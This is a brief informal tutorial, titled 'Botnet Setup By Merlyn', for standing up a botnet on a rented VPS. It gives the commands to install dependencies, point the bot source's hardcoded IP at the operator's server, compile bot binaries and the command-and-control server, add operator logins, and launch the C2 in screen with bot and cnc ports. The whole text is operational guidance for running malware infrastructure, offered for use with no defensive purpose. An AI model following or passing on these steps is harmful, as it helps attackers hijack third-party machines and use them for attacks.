[Botnet Setup By Merlyn]

So you've Bought a VPS and decided to setup a botnet, here's what you need to do.

Download the dependencies what you need for the botnet to work.

[Dependencies Commands]
yum install python python-paramiko screen gcc nano perl perl-CPAN wget
yum groupinstall "Development tools"

Alright now that all those dependencies are installed change the ip in the source
usually there is only one ip in the client.c/bot.c but sometimes you'll fine one in the cnc/c2
thats for selling builds with that source so change both if you have one in the cnc/c2 also.

[IPS Change in Client/bot]
    xxx.xxx.xxx.xxx

Sick you changed the ip and now are ready to compile your client/c2 to get you bins.

[Compile Command]
python compile.py client.c/bot.c

Now compilers are all different names just change the client and compile name to the ones you have
in your source, also if you dont no what bins are they are what u use to connect the bots to your botnet
you can find them to see if they have been made in [Enter Command] cd /var/www/html then type ls and enter.

Alright time to compile the cnc

[CNC Compile Command]
gcc cnc.c -o c2 -pthread

Ok the cnc had now been compiled time to go into the login and add users.

[Add logins Command]
nano logins.txt

that command creates a login txt in the cd that u typed it in now just add you user and password.
now that we got all that over screen your botnet with this command.

[Screen Command]
screen ./server [BotPort] 100 [CncPort]
